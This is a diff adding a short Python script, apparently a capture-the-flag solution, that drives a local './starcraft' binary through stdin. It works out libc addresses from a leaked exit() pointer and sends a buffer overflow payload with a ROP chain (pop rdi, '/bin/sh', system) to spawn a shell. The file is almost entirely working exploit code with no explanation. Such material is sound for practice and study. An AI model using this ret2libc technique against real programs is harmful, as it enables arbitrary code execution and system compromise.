@@ -1,0 +1,46 @@
+p.terminate(); read_thread.join()
+
+import subprocess, threading, os
+def thread_func(process):
+  data = os.read(process.stdout.fileno(), 1024)
+  while data != b'':
+    print(data.decode())
+    data = os.read(process.stdout.fileno(), 1024)
+
+
+p = subprocess.Popen('./starcraft', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) ; read_thread = threading.Thread(target=thread_func, args=(p,)) ; read_thread.start()
+p.stdin.write(b'6\n'); p.stdin.flush()
+p.stdin.write(b'1\n'); p.stdin.flush()
+p.stdin.write(b'2\n'); p.stdin.flush()
+
+low= -795025344
+high=32573
+real_exit=int(hex(high)+hex(low+2**32)[2:],16)
+virtual_exit=int('3A040',16)
+target=int('8E7BE',16)
+hex(real_exit-virtual_exit+target)
+
+insert=(real_exit-virtual_exit+target).to_bytes(8, byteorder='little')
+
+virtual_system=int('453A0',16)
+virtual_pop_rdi=int('21112',16)
+virtual_bin_sh=int('18CE57',16)
+hex(real_exit-virtual_exit+virtual_system)
+hex(real_exit-virtual_exit+virtual_pop_rdi)
+hex(real_exit-virtual_exit+virtual_bin_sh)
+
+insert3=(real_exit-virtual_exit+virtual_system).to_bytes(8, byteorder='little')
+insert1=(real_exit-virtual_exit+virtual_pop_rdi).to_bytes(8, byteorder='little')
+insert2=(real_exit-virtual_exit+virtual_bin_sh).to_bytes(8, byteorder='little')
+
+p.stdin.write(b'0\n'); p.stdin.flush()
+
+#until enemy dies
+
+p.stdin.write(b'A'*8+insert1+insert2+insert3+b'C'*8+b'\n'); p.stdin.flush()
+
+p.stdin.write(b'1\n'); p.stdin.flush()
+p.stdin.write(b'\x00'*8*33+insert+b'\x00\n'); p.stdin.flush()
+
+
+# ropshell.com
